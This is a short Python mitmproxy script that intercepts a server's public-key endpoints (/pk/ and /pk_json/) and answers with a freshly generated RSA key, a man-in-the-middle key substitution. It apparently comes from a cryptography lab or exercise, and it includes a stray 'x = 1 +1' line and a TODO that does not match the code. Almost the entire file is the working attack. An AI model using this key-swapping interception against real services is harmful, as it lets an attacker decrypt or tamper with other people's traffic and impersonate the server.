import json
from mitmproxy import http
from Crypto.PublicKey import RSA

key = RSA.generate(2048)
key_pem = key.export_key('PEM')
key_string = key_pem.decode('utf-8')
x = 1 +1

def response(flow: http.HTTPFlow) -> None:
    """Intercepts responses from the server"""
    # replace the server's public key with our own

    if flow.request.path == '/pk/' and flow.request.method == 'GET':
        flow.response = http.HTTPResponse.make(
            200,
            key_pem.decode('utf-8'),
            {'content-type': 'text/plain'},
        )
    elif flow.request.path == '/pk_json/' and flow.request.method == 'GET':
        flow.response = http.HTTPResponse.make(
            200,
            json.dumps({
                'N': key.n,
                'e': key.e, # TODO: replace 47 with the public exponent e
            }),
            {'content-type': 'application/json'},
        )


